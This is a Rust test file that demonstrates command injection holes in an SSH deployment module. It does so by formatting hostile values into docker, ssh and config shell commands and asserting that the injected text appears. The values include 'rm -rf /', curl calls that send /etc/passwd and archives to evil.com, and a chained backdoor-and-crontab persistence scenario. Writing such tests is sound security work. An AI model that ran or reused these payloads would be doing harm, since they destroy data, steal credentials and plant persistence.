//! Unit tests demonstrating command injection vulnerabilities
//! 
//! These tests show how unsanitized input in SSH deployment creates command injection attacks.
//! These vulnerabilities exist in blueprint-remote-providers/src/deployment/ssh.rs

use std::collections::HashMap;

/// Test demonstrating environment variable command injection vulnerability
/// Lines 200 in ssh.rs: docker_cmd.push_str(&format!(" -e {}={}", key, value));
#[test]
fn test_env_var_command_injection_vulnerability() {
    // This simulates the vulnerable code pattern from ssh.rs:200
    let mut docker_cmd = String::from("docker create");
    
    // Malicious environment variables that inject shell commands
    let mut env_vars = HashMap::new();
    env_vars.insert("NORMAL_VAR".to_string(), "normal_value".to_string());
    env_vars.insert("MALICIOUS_VAR".to_string(), "'; rm -rf /; echo 'pwned".to_string());
    env_vars.insert("EXFILTRATE".to_string(), "$(curl -X POST http://evil.com/data -d \"$(cat /etc/passwd)\")".to_string());
    
    // Vulnerable code pattern from ssh.rs
    for (key, value) in env_vars {
        docker_cmd.push_str(&format!(" -e {}={}", key, value));
    }
    
    println!("Generated command: {}", docker_cmd);
    
    // The resulting command contains injection:
    // docker create -e NORMAL_VAR=normal_value -e MALICIOUS_VAR='; rm -rf /; echo 'pwned -e EXFILTRATE=$(curl -X POST http://evil.com/data -d "$(cat /etc/passwd)")
    
    assert!(docker_cmd.contains("rm -rf /"), "Command injection vulnerability detected!");
    assert!(docker_cmd.contains("curl"), "Data exfiltration vulnerability detected!");
}

/// Test demonstrating JSON configuration injection vulnerability
/// Lines 507-511 in ssh.rs: echo '{}' | sudo tee /opt/blueprint/config/blueprint.json
#[test]
fn test_config_content_injection_vulnerability() {
    // Malicious JSON content that contains shell injection
    let malicious_config = r#"{"blueprint_id": "test'; rm -rf /opt/blueprint; curl http://evil.com/success; echo '", "service_url": "http://localhost"}"#;
    
    // Vulnerable code pattern from ssh.rs:507-510
    let create_config = format!(
        "echo '{}' | sudo tee /opt/blueprint/config/blueprint.json",
        malicious_config
    );
    
    println!("Generated command: {}", create_config);
    
    // The resulting command contains injection:
    // echo '{"blueprint_id": "test'; rm -rf /opt/blueprint; curl http://evil.com/success; echo '", "service_url": "http://localhost"}' | sudo tee /opt/blueprint/config/blueprint.json
    
    assert!(create_config.contains("rm -rf"), "Configuration injection vulnerability detected!");
    assert!(create_config.contains("curl http://evil.com"), "Command injection in config detected!");
}

/// Test demonstrating container image name injection vulnerability
/// Lines 164-166 in ssh.rs: format!("docker pull {}", image)
#[test]
fn test_image_name_injection_vulnerability() {
    // Malicious image name that injects shell commands
    let malicious_image = "nginx:latest; curl -X POST http://evil.com/pwned -d 'Container compromised'; echo fake_image #";
    
    // Vulnerable code pattern from ssh.rs:164
    let cmd = format!("docker pull {}", malicious_image);
    
    println!("Generated command: {}", cmd);
    
    // The resulting command contains injection:
    // docker pull nginx:latest; curl -X POST http://evil.com/pwned -d 'Container compromised'; echo fake_image #
    
    assert!(cmd.contains("curl -X POST"), "Image name injection vulnerability detected!");
    assert!(cmd.contains("Container compromised"), "Data exfiltration in image pull detected!");
}

/// Test demonstrating container ID injection in log streaming
/// Lines 549-553 in ssh.rs: format!("docker logs{} {}", follow_flag, container_id)
#[test]
fn test_container_id_injection_vulnerability() {
    // Malicious container ID that injects shell commands
    let malicious_id = "abc123; curl -X POST http://evil.com/logs -d \"$(docker ps -a | base64)\"; echo fake_container #";
    
    // Vulnerable code pattern from ssh.rs:549-553
    let follow = false;
    let cmd = format!(
        "docker logs{} {}",
        if follow { " -f" } else { "" },
        malicious_id
    );
    
    println!("Generated command: {}", cmd);
    
    // The resulting command contains injection:
    // docker logs abc123; curl -X POST http://evil.com/logs -d "$(docker ps -a | base64)"; echo fake_container #
    
    assert!(cmd.contains("curl -X POST"), "Container ID injection vulnerability detected!");
    assert!(cmd.contains("docker ps -a"), "Container enumeration attack detected!");
}

/// Test demonstrating SSH parameter injection vulnerability
/// Lines 363-383 in ssh.rs: SSH command construction with unsanitized input
#[test]
fn test_ssh_parameter_injection_vulnerability() {
    // Malicious SSH parameters that inject shell commands
    let malicious_host = "test.com'; curl http://evil.com/ssh_pwned; echo 'fake_host";
    let malicious_user = "testuser'; cat /etc/passwd | base64 | curl -X POST http://evil.com/data; echo 'fake_user";
    let port = 22;
    let command = "echo test";
    
    // Vulnerable code pattern from ssh.rs:363-383 (simplified)
    let mut ssh_cmd = String::from("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null");
    
    if port != 22 {
        ssh_cmd.push_str(&format!(" -p {}", port));
    }
    
    ssh_cmd.push_str(&format!(" {}@{}", malicious_user, malicious_host));
    ssh_cmd.push_str(&format!(" '{}'", command));
    
    println!("Generated SSH command: {}", ssh_cmd);
    
    // The resulting command contains injection in user and host parameters
    assert!(ssh_cmd.contains("curl http://evil.com"), "SSH host parameter injection detected!");
    assert!(ssh_cmd.contains("cat /etc/passwd"), "SSH user parameter injection detected!");
}

/// Test demonstrating systemd template injection vulnerability  
/// Lines 514-527 in ssh.rs: Numeric values formatted into systemd templates
#[test]
fn test_systemd_template_injection_vulnerability() {
    // Potentially malicious numeric values (could be manipulated)
    let cpu_percent = 200.5; // Over 100% - suspicious
    let memory_mb = f32::INFINITY; // Infinity value
    let tasks_max = 1000;
    
    // Vulnerable code pattern from ssh.rs:514-527
    let systemd_limits = format!(
        r#"
        sudo mkdir -p /etc/systemd/system/blueprint-runtime.service.d
        sudo tee /etc/systemd/system/blueprint-runtime.service.d/limits.conf > /dev/null <<EOF
        [Service]
        CPUQuota={}%
        MemoryMax={}M
        TasksMax={}
        EOF
        "#,
        cpu_percent as u32,
        memory_mb as u32,
        tasks_max
    );
    
    println!("Generated systemd config: {}", systemd_limits);
    
    // Check for suspicious values that could indicate manipulation
    assert!(systemd_limits.contains("CPUQuota=200%"), "CPU over-allocation detected!");
    assert!(systemd_limits.contains("MemoryMax=0M"), "Memory infinity converted to 0 - potential DoS!");
}

/// Test showing how the vulnerabilities can be exploited in sequence
#[test]
fn test_chained_exploitation_scenario() {
    println!("=== CHAINED EXPLOITATION SCENARIO ===");
    
    // Step 1: Inject through environment variables during container creation
    let mut env_vars = HashMap::new();
    env_vars.insert("BACKDOOR".to_string(), "'; mkdir -p /tmp/.hidden; echo 'SSH_KEY' > /tmp/.hidden/key; chmod 600 /tmp/.hidden/key; echo '".to_string());
    
    let mut docker_cmd = String::from("docker create");
    for (key, value) in env_vars {
        docker_cmd.push_str(&format!(" -e {}={}", key, value));
    }
    
    println!("Step 1 - Container creation with backdoor: {}", docker_cmd);
    
    // Step 2: Inject through configuration to establish persistence
    let persistence_config = r#"{"blueprint_id": "test'; echo \"* * * * * curl http://evil.com/heartbeat\" | crontab -; echo '", "service_url": "http://localhost"}"#;
    
    let config_cmd = format!(
        "echo '{}' | sudo tee /opt/blueprint/config/blueprint.json",
        persistence_config
    );
    
    println!("Step 2 - Configuration with persistence: {}", config_cmd);
    
    // Step 3: Inject through log streaming to exfiltrate data
    let exfiltration_id = "container123; tar -czf /tmp/sensitive.tar.gz /etc /home; curl -X POST http://evil.com/upload -F 'file=@/tmp/sensitive.tar.gz'; echo fake #";
    
    let log_cmd = format!("docker logs {}", exfiltration_id);
    
    println!("Step 3 - Log streaming with data exfiltration: {}", log_cmd);
    
    // All three steps contain injection
    assert!(docker_cmd.contains("mkdir -p /tmp/.hidden"), "Backdoor creation injection detected!");
    assert!(config_cmd.contains("crontab"), "Persistence injection detected!");
    assert!(log_cmd.contains("tar -czf"), "Data exfiltration injection detected!");
    
    println!("=== FULL EXPLOITATION CHAIN DEMONSTRATED ===");
}